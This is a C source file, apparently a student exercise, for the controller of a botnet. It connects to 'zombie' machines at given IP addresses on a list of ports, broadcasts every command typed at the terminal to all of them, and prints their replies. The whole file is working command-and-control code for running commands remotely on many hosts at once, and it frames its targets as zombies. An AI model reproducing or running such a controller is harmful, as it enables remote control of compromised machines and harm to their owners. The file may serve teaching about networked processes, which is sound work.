		#include <stdlib.h>
		#include <unistd.h>
		#include <string.h>
		#include <sys/types.h>
		#include <fcntl.h>
		#include <stdarg.h>
		#include <time.h>
		#include <arpa/inet.h>
		#include <netdb.h>
		#include <netinet/in.h>
		#include <sys/wait.h>
		#include <sys/stat.h>
		#include <sys/sem.h>
		#include <sys/shm.h>
		#include <sys/socket.h>

		#include "utils_v2.h"
		#include "port.h"
		#include "botNet.h"
		
		Zombie tabZombie[BACKLOG];
		struct pollfd fds[10];
		volatile sig_atomic_t numberOfZombie = 0;
		volatile sig_atomic_t child = 0;

		//
		//
		//POST close all the socket and send a sigint to all child and end the program when CTRL + D in terminal Controller
		//
		void done1(){
			for (int i = 0; i < numberOfZombie; ++i){
				skill(tabZombie[i].pid,SIGINT);
				sclose(fds[i].fd);
			}
	
			skill(child,SIGINT);
			child=0;
			exit(0);
		}

	
		//
		//POST close all the socket and end the program if the zombie is killed
		//
		void done2(){
			exit(0);
		}

		int main(int argc, char *argv[])
		{	
	    	//block the signal SIGPIPE
			sigset_t set;
	    	ssigemptyset(&set);
	    	ssigaddset(&set,SIGPIPE);
	    	ssigprocmask(SIG_BLOCK, &set, NULL);

	    	// add the action for child an parent
	    	ssigaction(SIGUSR1,done2);
			getPortIp(argv,argc);

			getConnectedZombie();
			char tabCommande [BUFFERSIZE];
			child = fork_and_run0(discussionProcess);
			ssigaction(SIGINT,done1);

			while(true){
				readWriteCommand(tabCommande);
			}
			return 0;
		}

		void discussionProcess(){
			char tabResponse[BUFFERSIZE];
			int numberSockdead=0;
			while(numberSockdead!=numberOfZombie){
				int ret = poll(fds, numberOfZombie, 3000);
				checkNeg(ret, "server poll error");
				if (ret == 0)
					continue;
				for (int i = 0; i < numberOfZombie; ++i){
					if (fds[i].revents & POLLIN){
						int numberChar2 = sread(fds[i].fd,tabResponse,BUFFERSIZE);
						if (numberChar2 != 0){
							swrite(1,tabResponse,numberChar2);
						}else if(fds[i].fd!=0){
							numberSockdead++;
							sclose(fds[i].fd);
							fds[i].fd=0;
						}	
				}

			}
		}
	skill(getppid(),SIGUSR1);	
}

		void getPortIp(char** ip,int numberOfIp){
			int indice=0;
			for (int i = 1; i < numberOfIp; ++i){
				for (int j = 0; j < 10; ++j){

				int sock = ssocket();
				struct sockaddr_in addr;
				memset(&addr,0,sizeof(addr)); 
				addr.sin_family = AF_INET;
				addr.sin_port = htons(tabPorts[j]);
				inet_aton(ip[i],&addr.sin_addr);
				int ret = connect(sock,
				 (struct sockaddr *) &addr, sizeof(addr));
				if(ret != -1){
					numberOfZombie++;
					fds[indice].fd=sock;
					fds[indice].events = POLLIN;
					indice++;
				}
			}

		}
			
			 
		}

		void getConnectedZombie(){
		for (int i = 0; i < numberOfZombie ; ++i){
				sread(fds[i].fd,&tabZombie[i],sizeof(Zombie));
				printf("le controlleur ecoute sur le port : %d du zombie %d\n",
				 tabZombie[i].port,i+1);	
				}
		}
		
		void readWriteCommand(char* tabCommande){
			printf("Veuillez entrez votre commande : \n");
			memset(tabCommande, 0, sizeof(*tabCommande));
			int numberChar=read(0,tabCommande,BUFFERSIZE);
			if(numberChar==0 && child!=0)done1();
			for (int i = 0; i < numberOfZombie; ++i){
				if(fds[i].fd!=0){
					int res=write(fds[i].fd,tabCommande,numberChar);
					if(res==-1)fds[i].fd=0;
				}
			}
		}

